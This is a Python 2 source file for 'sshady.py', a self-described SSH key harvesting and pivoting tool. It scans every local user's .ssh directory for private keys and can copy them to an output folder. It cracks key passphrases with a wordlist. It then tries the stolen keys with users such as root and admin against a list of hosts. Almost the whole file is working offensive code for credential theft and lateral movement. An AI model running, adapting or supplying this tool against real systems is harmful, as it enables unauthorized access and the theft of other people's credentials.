#!/usr/bin/env python

"""
sshady.py -- SSH key harvesting and pivoting things.
          -- Dropping cyber warheads on digital foreheads.
          --
          -- by Daniel Roberson @dmfroberson July/2017

This is still being worked on, so probably lots of bugs and weirdness.

TODO:
  - Cracking improvements
    -- -u/-U hydra-style to specify user or list
    -- -h/-H to specfy single host or list
    -- Determine key type to avoid trying all of them.
    -- threading?
  - Attempt to login to supplied hosts using captured keys
    -- Nmap XML/greppable output as input?
    -- grep users shell histories for hosts they've connected to?
       - also glean usernames from this!!
    -- Supply an input list for hosts/usernames
       - Create unique list based on pwent for use on current network
  - Input directory full of keys, or specify /home rather than searching pwents
  - General cleanup.. globals, super long main(), etc.

Requires:
  - paramiko
"""

import os
import pwd
import shutil
import argparse
import paramiko


# Globals/Settings
#WORDLIST = "wordlist.txt"
TERSE = False
CRACK = True
OUTDIR = None
HOSTFILE = None
USERFILE = None

USERS = ["root", "nagios", "admin", "guest", "www", "www-data", "rsync"]
VALID_KEYS = []


class Settings(object):
    WORDLIST = "wordlist.txt"

    @staticmethod
    def update_wordlist(wordlist):
        WORDLIST = wordlist

        # Make sure wordlist is readable.
        if not os.access(WORDLIST, os.R_OK):
            xprint("[-] Unable to open wordlist %s for reading" % WORDLIST)
            xprint("[-] Exiting.")
            terseprint("Unable to open wordlist %s for reading. Exiting." % \
                       WORDLIST)
            return False
        return True

class Color(object):
    """ Color Object
    """
    BOLD = "\033[1m"
    END = "\033[0m"

    @staticmethod
    def disable():
        """ Color.disable() -- Disable color output"

        Args:
            None

        Returns:
            Nothing
        """
        Color.BOLD = ""
        Color.END = ""

    @staticmethod
    def bold_string(buf):
        """ Color.bold_string() -- Wrap a string in ANSI codes to make it bold

        Args:
            buf (str) - String to wrap

        Returns:
            A string encapsulated in ANSI codes to make it bold
        """
        return Color.BOLD + buf + Color.END


def xprint(message):
    """ xprint() -- Wrapper for print function that honors terse setting

    Args:
        message (str) - String to output

    Returns:
        Nothing
    """
    if not TERSE:
        print message


def terseprint(message):
    """ terseprint() -- Wrapper for print function that displays terse messages

    Args:
        message (str) - String to output

    Returns:
        Nothing
    """
    if TERSE:
        print message


def crack_key(keyfile, username, wordlist):
    """ crack_key() -- Launches a wordlist attack against SSH key

    Args:
        keyfile (str)  - Path to SSH private key.
        wordlist (str) - Path to wordlist.

    Returns:
        True if the password has been discovered.
        False if the password has not been discovered.
    """
    # Try username as password first
    result = try_key(keyfile, username)
    if type(result) == str:
        xprint(Color.bold_string(
            "      [+] Success! %s:%s" % (keyfile, username)))
        terseprint("%s %s" % (keyfile, username))
        VALID_KEYS.append((username, keyfile, username))
        return True

    # Try with wordlist.
    with open(wordlist) as passwords:
        for password in passwords:
            password = password.rstrip()
            if not password:
                continue

            result = try_key(keyfile, password)
            if type(result) == str:
                xprint(Color.bold_string(
                    "      [+] Success! %s:%s" % (keyfile, result)))
                terseprint("%s %s" % (keyfile, result))
                VALID_KEYS.append((username, keyfile, result))
                return True

    xprint("      [-] Unable to crack SSH key with supplied wordlist.")
    terseprint(keyfile)

    return False


def get_key_type(keyfile):
    """ get_key_type() -- determines which type of SSH key a keyfile is

    Args:
        keyfile (str) - Path to SSH key file

    Returns:
        paramiko from_private_key_file relevant to keyfile on success
        None if this function was unable to determine key type.
    """
    ssh_key_types = [paramiko.RSAKey.from_private_key_file,
                     paramiko.DSSKey.from_private_key_file,
                     paramiko.ECDSAKey.from_private_key_file]

    for key_type in ssh_key_types:
        try:
            key_type(keyfile)
        except paramiko.ssh_exception.PasswordRequiredException:
            return key_type
        except paramiko.ssh_exception.SSHException:
            continue

        return key_type

    return None


def try_key(keyfile, password=None):
    """ try_key() -- Tries to use an SSH key.

    Args:
        keyfile (str)  - Path to SSH private key
        password (str) - Password to attempt. Default None.

    Returns:
        True if it is a valid key, but the wrong password was supplied.
        False if it is not a valid key.
        The password if it is a valid key and password.
    """
    key_type = get_key_type(keyfile)

    if key_type is None:
        return False

    try:
        key_type(keyfile, password=password)
    except paramiko.ssh_exception.PasswordRequiredException:
        # Valid key, wrong password
        return True
    except paramiko.ssh_exception.SSHException:
        # Key doesn't work here
        return False

    return password


def process_key(keyfile, username):
    """ process_key() -- Determine whether a file is a valid SSH key or not and
                      -- act accordingly.

    Args:
        keyfile (str) - Path to file to check

    Returns:
        True if keyfile is an SSH key.
        False if keyfile is not an SSH key.
    """
    result = try_key(keyfile)

    if result == True:
        xprint("  [+] %s appears to be a valid key" % keyfile)

        # Copy keys for the future, if asked to do so.
        if OUTDIR:
            outfile = os.path.join(OUTDIR, "%s-%s" % \
                                   (username, os.path.basename(keyfile)))
            shutil.copy2(keyfile, outfile)

        # Crack passwords, if asked.
        if CRACK:
            xprint("    [*] Attempting to crack..")
            crack_key(keyfile, username, Settings.WORDLIST)
        else:
            terseprint(keyfile)
    elif result == False:
        # Probably not an SSH key
        return False
    elif result == None:
        # No password
        xprint("  [+] %s appears to be a valid, passwordless key" % keyfile)
        terseprint("%s -- NO PASSWORD" % keyfile)
        VALID_KEYS.append((username, keyfile, result))

        return True

    return True


def try_ssh_key_login(username, keyfile, password, host, port=22):
    """ try_ssh_key_login() -- Attempts an SSH login using supplied credentials

    Args:
        username (str) - Username
        password (str) - Password for SSH key

    Returns:
        True if the login was successful
        False otherwise
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    key_type = get_key_type(keyfile)
    if key_type is None:
        # Not a valid key
        return False

    key = key_type(keyfile, password=password)

    # Supress error messages. TODO: figure out if there's a better way.
    paramiko.util.log_to_file("/dev/null")

    try:
        client.connect(
            host,
            username=username,
            port=port,
            pkey=key,
            allow_agent=False,
            look_for_keys=False)
    except paramiko.ssh_exception.AuthenticationException:
        return False
    except paramiko.ssh_exception.SSHException:
        # TODO: Handle this properly. Happens when host isnt running SSH
        return False
    except paramiko.ssh_exception.NoValidConnectionsError:
        # TODO: Handle this properly. Happens when cant connect.
        return False

    return True


def find_ssh_directories():
    """ find_ssh_directories() -- Search pwents for home directories with .ssh
            directories. Scans each file in .ssh directory for valid SSH keys.
            Valid keys are added to VALID_KEYS list.

    Args:
        None

    Returns:
        True
    """
    # TODO: search /home for orphaned home directories that may contain keys
    for pwent in pwd.getpwall():
        user = pwent[0]
        sshdir = os.path.join(os.path.expanduser("~%s" % user), ".ssh")

        if os.path.isdir(sshdir):
            xprint("[*] Found .ssh directory for user %s: %s" % (user, sshdir))
            for root, _, filenames in os.walk(sshdir):
                for filename in filenames:
                    checkfile = os.path.join(root, filename)
                    process_key(checkfile, user)

    xprint("")
    xprint("[+] %s keys discovered." % len(VALID_KEYS))

    return True


def parse_cli():
    """ parse_cli() -- Parse CLI input

    Args:
        None

    Returns:
        ArgumentParser namespace relevant to supplied CLI options
    """
    description = "example: ./sshady.py [-d <outdir>]"
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument("-t",
                        "--terse",
                        help="Toggles terse output (useful for scripting)",
                        action="store_true",
                        required=False,
                        default=False)
    parser.add_argument("-w",
                        "--wordlist",
                        help="Specify wordlist to use. Default: %s" % \
                        Settings.WORDLIST,
                        required=False,
                        default=Settings.WORDLIST)
    parser.add_argument("-n",
                        "--nocrack",
                        help="Don't attempt to crack SSH keys.",
                        action="store_false",
                        required=False,
                        default=True)
    parser.add_argument("-d",
                        "--directory",
                        help="Optional directory to save keys to",
                        required=False,
                        default=None)
    parser.add_argument("-f",
                        "--hosts",
                        help="File containing list of hosts to try discovered keys. Format: \"ip.address port\" (port optional)",
                        required=False,
                        default=None)
    parser.add_argument("-u",
                        "--users",
                        help="File containing list of usernames to try",
                        required=False,
                        default=None)
    parser.add_argument("--nocolor",
                        help="Disable ANSI color code output",
                        required=False,
                        action="store_true")

    args = parser.parse_args()

    if args.nocolor:
        Color.disable()

    return args


def main():
    """ main() -- entry point of program

    Args:
        None

    Returns:
        os.EX_OK on successful run
        os_EX_USAGE on failed run
    """
    #global WORDLIST
    global TERSE
    global CRACK
    global OUTDIR
    global USERS
    global HOSTFILE
    global USERFILE

    xprint("[+] sshady.py -- by Daniel Roberson @dmfroberson")
    xprint("")

    args = parse_cli()

    if not Settings.update_wordlist(args.wordlist):
        return os.EX_USAGE
    
    #WORDLIST = args.wordlist
    TERSE = args.terse
    CRACK = args.nocrack
    OUTDIR = args.directory
    HOSTFILE = args.hosts
    USERFILE = args.users

    # # Make sure wordlist is readable.
    # if not os.access(WORDLIST, os.R_OK):
    #     xprint("[-] Unable to open wordlist %s for reading" % WORDLIST)
    #     xprint("[-] Exiting.")
    #     terseprint("Unable to open wordlist %s for reading. Exiting." % \
    #                WORDLIST)
    #     return os.EX_USAGE

    # Make sure output directory is writable.
    if OUTDIR and not os.path.isdir(OUTDIR):
        xprint("[-] %s is not a directory." % OUTDIR)
        xprint("[-] Exiting.")
        terseprint("%s is not a directory. Exiting." % OUTDIR)
        return os.EX_USAGE

    if OUTDIR and not os.access(OUTDIR, os.W_OK):
        xprint("[-] Unable to write to output directory %s" % OUTDIR)
        xprint("[-] Exiting.")
        terseprint("Unable to write to output directory %s. Exiting." % OUTDIR)
        return os.EX_USAGE

    xprint("[+] Searching for SSH keys..")

    # Search for users passwords.
    # TODO don't do this if key directory is specified.
    find_ssh_directories()

    # If a hostfile is specified, loop through hosts and try to login with
    # each of the harvested keys.
    if HOSTFILE:
        xprint("")
        xprint("[+] Attempting to login to hosts using discovered keys..")

        # Get list of hostnames from file, if specified
        try:
            hosts = [line.rstrip(os.linesep) for line in open(HOSTFILE)]
        except IOError, err:
            xprint("  [-] Unable to open host list %s: %s" % (HOSTFILE, err))
            xprint("  [-] Exiting.")
            return os.EX_USAGE

        # Get list of usernames from file, if specified
        # TODO: make sure usernames are valid.
        if USERFILE:
            try:
                USERS = [line.rstrip(os.linesep) for line in open(USERFILE)]
            except IOError, err:
                xprint("  [-] Unable to open user list %s: %s" % \
                       (USERFILE, err))
                xprint("  [-] Exiting.")
                return os.EX_USAGE

        for host in hosts:
            port = 22
            if " " in host:
                port = int(host.split()[1])
                host = host.split()[0]
            xprint("  [*] Trying %s:%s" % (host, port))

            for key in VALID_KEYS:
                username, keyfile, password = key

                # Try username first
                if try_ssh_key_login(username, keyfile, password, host, port):
                    xprint("    [+] %s@%s -- %s:%s LOGIN SUCCESSFUL!" % \
                           (username, host, keyfile, password))

                # Try list of usernames now.
                for user in USERS:
                    if try_ssh_key_login(user, keyfile, password, host, port):
                        xprint("    [+] %s@%s -- %s:%s LOGIN SUCCESSFUL!" % \
                               (user, host, keyfile, password))

    xprint("")
    xprint("[+] You must defeat Sheng Long to stand a chance.")
    xprint("[+] Done.")

    return os.EX_OK


if __name__ == "__main__":
    exit(main())
